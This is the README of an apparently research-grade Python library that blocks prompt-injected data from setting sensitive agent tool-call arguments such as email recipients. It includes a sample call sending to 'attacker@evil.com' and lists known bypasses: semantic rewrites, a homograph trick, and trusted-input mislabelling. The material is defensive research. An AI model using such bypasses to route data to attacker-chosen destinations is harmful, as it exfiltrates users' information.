# Verb-Authority Gate

[![CI](https://github.com/yairsabag/verb-authority/actions/workflows/ci.yml/badge.svg)](https://github.com/yairsabag/verb-authority/actions/workflows/ci.yml)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-3776AB.svg)](https://www.python.org/downloads/)
[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

A small Python gate that prevents untrusted agent data from authoring sensitive
tool-call arguments—without classifying prompts.

**Data selects. Never authors.**

> **Exact guarantee:** under the gate's provenance model, untrusted data cannot
> author tool-call arguments whose policy is `trusted_fixed`. The decision is
> enforced before the tool runs; the gate does not try to decide whether a
> prompt is malicious.

This is a research-grade boundary, not a claim that prompt injection is
impossible. The optional ledger catches exact reuse, emails and URLs extracted
from returned text, and several lexical disguises. It does **not** follow a
value through semantic reconstruction—for example, turning “attacker at evil
dot com” into an address. A developer can also defeat the guarantee by marking
untrusted input as trusted without using the ledger. Systems such as CaMeL and
FIDES use interpreter- or planner-level information-flow tracking to cover that
deeper boundary.

## Install

Verb Authority is not published on PyPI. Install the current source directly
from GitHub:

```bash
python -m pip install "verb-authority @ git+https://github.com/yairsabag/verb-authority.git@@v0.9.0"
python -m verb_authority
```

The second command runs the built-in demo. The package has no runtime
dependencies and keeps the existing `verb_authority.py` module and import API.

For a local checkout instead:

```bash
git clone https://github.com/yairsabag/verb-authority.git
cd verb-authority
python -m pip install .
```

## 60-second quickstart

The gate accepts a normalized tool call shaped as `{"name": ..., "input":
...}`. Provider-specific tool-call objects should be converted to that small
shape before dispatch.

```python
from verb_authority import Param, Registry, Tool, build_policy, dispatch

registry = Registry()
registry.add(
    Tool("send_email", [Param("to", "email"), Param("body", "string")])
)
policy = build_policy(registry)

# The model proposes an attacker-controlled recipient. The only trusted value
# is the recipient the application obtained from a trusted/user-approved flow.
tool_call = {
    "name": "send_email",
    "input": {"to": "attacker@evil.com", "body": "Meeting summary"},
}
decision = dispatch(
    registry,
    policy,
    tool_call,
    trusted_args={"to": "alice@company.com"},
)

print(decision.allow)   # False
print(decision.reason)  # param 'to' is a locked sink; data may not author it
```

Call `dispatch` immediately before tool execution. Execute only when
`decision.allow` is true, and request human approval when
`decision.needs_confirm` is true.

## What the gate does

The project is one importable module with five cooperating pieces:

- **Per-parameter policies.** Sensitive sinks such as recipients, URLs,
  accounts, paths, and commands default to `trusted_fixed`; bounded values are
  type-checked; free-text bodies are treated as outbound payloads.
- **Safe-by-default inference.** Policies are inferred from the existing tool
  schema. Ambiguous parameters on consequential tools stay locked and appear in
  a one-time review queue.
- **Declared capabilities.** `Param(..., sink=True|False)` lets a tool schema
  resolve overloaded names such as `path` without relying on the heuristic.
- **Verb-risk tiers.** Tools are classified as read-only, write, financial,
  destructive, or code execution. Financial, destructive, and code-execution
  calls return `needs_confirm=True`.
- **Optional provenance ledger.** Values returned by tools are recorded as
  untrusted. Exact reuse, contained email/URL extraction, and canonicalized
  lexical variants are forced back to data provenance even if
  `trusted_args` was wired incorrectly.

The gate rejects unknown tools and unknown arguments. It does not replace your
tool schema's required-field validation or the tool implementation's own
authorization checks.

## Integrating a tool loop

`trusted_args` is an application provenance declaration: an argument is marked
trusted only when it equals the corresponding application-supplied value.
Everything else is data.

```python
from verb_authority import Param, ProvenanceLedger, Registry, Tool
from verb_authority import build_policy, dispatch

registry = Registry()
registry.add(
    Tool(
        "send_email",
        [Param("to", "email"), Param("subject"), Param("body")],
    )
)
policy = build_policy(registry)
ledger = ProvenanceLedger()

# After normalizing the model/provider tool call:
decision = dispatch(
    registry,
    policy,
    tool_call,
    trusted_args={"to": user_confirmed_email},
    ledger=ledger,
)
if not decision.allow:
    return {"error": decision.reason}
if decision.needs_confirm and not ask_user(decision.reason):
    return {"error": "user denied"}

result = run_tool(tool_call)
ledger.record_result(result)
```

Thread one ledger through the session and record each result immediately after
the tool returns. The ledger is a containment layer, not sound taint tracking:
it recognizes values and selected lexical forms, not arbitrary transformations
or control flow.

## Evidence and demos

The complete pytest suite contains 35 tests covering policy inference,
declared capabilities, verb risk, the gate, dispatch, ledger containment, and
canonicalization:

```bash
python -m pytest -v
```

Additional executable evaluations are intentionally kept as small scripts:

```bash
python validate_v01.py   # 11 schemas / 31 parameters; 0 silent-unsafe outcomes
python chain_demo.py     # laundering without vs. with the ledger
python adversarial.py    # known successes and failures by attack family
python adaptive.py       # adaptive resistance depth and first observed break
python capability_demo.py
```

The adaptive evaluation found a mixed-script homograph bypass in the earlier
implementation. Canonicalization raised the observed break point from tier 2
to tier 5 in the included attacker; the current break is semantic rewrite.
That result describes this test arsenal, not a universal security score.

`agent_demo.py` and `resolve_live.py` are optional Anthropic-backed demos and
require `ANTHROPIC_API_KEY`. The core module, tests, and offline evaluations do
not require an API key.

## Security boundary and known limitations

This project deliberately publishes its failure modes:

- **Provenance must be real.** Without a ledger, `trusted_args` is only as
  trustworthy as the application code that supplies it. Data mislabeled as
  trusted can reach a locked sink.
- **Semantic rewrites are not tracked.** The ledger matches exact values,
  contained risk-shaped strings, and canonicalized lexical variants. It cannot
  track a value the model interprets and reconstructs.
- **Integrity, not confidentiality.** The gate controls whether untrusted data
  can author sensitive arguments. It does not track secrets or stop private
  data from leaving through an otherwise authorized channel.
- **Tool calls, not model output.** Text returned to a human is not audited, so
  untrusted content can still social-engineer the user through the agent's
  reply.
- **Heuristics need review.** Tool risk and undeclared parameter policies are
  inferred from names and types. Review `PolicySet.review`, declare overloaded
  sink capabilities, and keep the registry accurate.
- **Application controls still apply.** Required arguments, authentication,
  authorization, rate limits, sandboxing, and human confirmation must still be
  enforced by the surrounding system.

Run `python adversarial.py` to see the known gaps exercised rather than hidden.
Please report new bypasses with the repository's focused issue template; keep
sensitive deployment details out of public issues and follow
[`SECURITY.md`](SECURITY.md).

## Related work and positioning

Verb Authority is a minimal, drop-in experiment inspired by Google DeepMind's
**CaMeL** (“Defeating Prompt Injections by Design,” arXiv:2503.18813,
Apache-2.0). It trades CaMeL's interpreter-level soundness for adoption in an
existing tool loop.

The closest structural approaches make different tradeoffs:

- **CaMeL** tracks taint through a custom interpreter.
- **FIDES** tracks integrity and confidentiality through a dedicated planner.
- **Progent** enforces a policy over tool calls; it is complementary to this
  project's value-provenance question.
- **NeuroTaint** performs semantic taint analysis offline rather than blocking
  calls at runtime.
- Detector-based guardrails classify content or intent and can be layered with
  this approach, but they provide a different kind of control.

[`LANDSCAPE.md`](LANDSCAPE.md) contains the detailed field map, citations, and
the places where this project does less than the research systems. If you need
sound transformation tracking or confidentiality enforcement, choose one of
those deeper systems rather than this module.

## Project status

v0.9.0 is early, research-grade work built in public. It is not described as
production-ready. See [`CHANGELOG.md`](CHANGELOG.md) for the v0.9.0 release notes
release notes and [`CONTRIBUTING.md`](CONTRIBUTING.md) for focused contribution
guidance.

Licensed under Apache-2.0.
